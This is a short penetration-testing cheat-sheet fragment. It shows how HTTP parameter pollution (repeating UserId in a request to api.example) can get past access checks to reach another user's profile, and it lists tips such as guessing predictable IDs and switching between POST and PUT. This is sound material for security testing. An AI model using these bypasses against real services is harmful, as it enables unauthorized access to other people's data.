```
# Bypass restrictions using parameter pollution
# You can use the same parameter several times
api.example/profile?UserId=123 # Ok, your profile
api.example/profile?UserId=456 # ERROR
api.example/profile?UserId=456&UserId=123 # OK, it can work

```

```
# Tips
# - Some encoded/hashed IDs can be predictable --> Create accounts to see
# - Try some id, user_id, message_id even if the application seems to not offer it (on API for ex)
# - Parameter Polluttion (HPP)
# - Switch between POST and PUT to bypass potential controls
# - 

```